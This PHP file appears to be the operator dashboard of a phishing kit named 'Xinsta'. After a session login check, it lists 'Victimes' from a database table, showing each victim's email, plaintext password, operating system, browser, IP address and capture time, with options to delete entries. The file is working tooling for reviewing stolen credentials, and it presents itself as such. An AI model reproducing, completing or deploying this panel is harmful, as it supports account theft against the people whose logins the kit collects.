<?php
session_start();
if ($_SESSION['login'] != "true") {
  header("Location: index.php");
  die();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, intiale-scale=1.0">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.2.0/css/all.css" integrity="sha384-hWVjflwFxL6sNzntih27bfxkr27PmbbK/iSvJ+a4+0owXq79v+lsFkW54bOGbiDQ" crossorigin="anonymous">
	<link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
	<link rel="stylesheet" type="text/css" href="assets/css/normalize.css">
	<link rel="stylesheet" type="text/css" href="assets/css/styleDashboard.css">
	<link rel="stylesheet" type="text/css" href="assets/css/styleVictimes.css">
	<link rel="stylesheet" type="text/css" href="assets/css/scrollbar.css">
	<link rel="icon" href="assets/img/icon.png">
	<title>Xinsta - Victimes</title>

</head>
<body>
	<nav>
		<div id="container">
			<a href="dashboard.php"><img src="assets/img/icon.png" alt="" id="navbar_img" style="cursor: pointer;"></a>
			<div id="btns">
				<a href="logout.php?log=out"><button id="btnLogOut">Log Out</button></button>
				<div id="btnVictime">
  				<a href="#">My Victimes</a>
				</div>
			</div>
		</div>
	</nav>
<div id="container">
<div class="scrollbar" id="scrollbar-custom">
	<div id="dashboard_content" style="overflow-x: auto;">
<table>
	<tr>
		<th>Email</th>
		<th>Password</th>
		<th>Os</th>
		<th>Browser</th>
		<th>Ip</th>
		<th>Time</th>
		<th>Delete</th>
	</tr>

<?php
session_start();
include "config.php";

$noData = "";
$C_id = $_SESSION['C_id'];
$sql = "SELECT * FROM datas WHERE fuckerId=$C_id ORDER BY id DESC";

$result = mysqli_query($conn, $sql);

if (mysqli_num_rows($result) > 0) {
	while ($rows = mysqli_fetch_assoc($result)) {
		echo "<tr id='vic".$rows["id"]."'>";

		echo "<td>";
		echo $rows["email"];
		echo "</td>";

		echo "<td>";
		echo $rows["pass"];
		echo "</td>";

		echo "<td>";
		echo $rows["os"];
		echo "</td>";

		echo "<td>";
		echo $rows["browser"];
		echo "</td>";

		echo "<td>";
		echo $rows["ip"];
		echo "</td>";

		echo "<td>";
		echo $rows["xtime"];
		echo "</td>";

		echo "<td>";
		echo '<i class="fas fa-trash-alt" num="'.$rows["id"].'" id="delete" style="font-size: 24px;color: #ef494d;margin-left: 21px;cursor: pointer;"></i>';
		echo "</td>";

		echo "</tr>";
	}
}else{
	$noData = "No data available in table";
}
?>
</table>
</div>
<h1 id="noData"><?php echo $noData; ?></h1>
</div>
<div id="clear"></div>

<footer id="footer">Xinsta All rights reserved.</footer>

<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
<script type="text/javascript" src="assets/js/index.js"></script>
</body>
</html>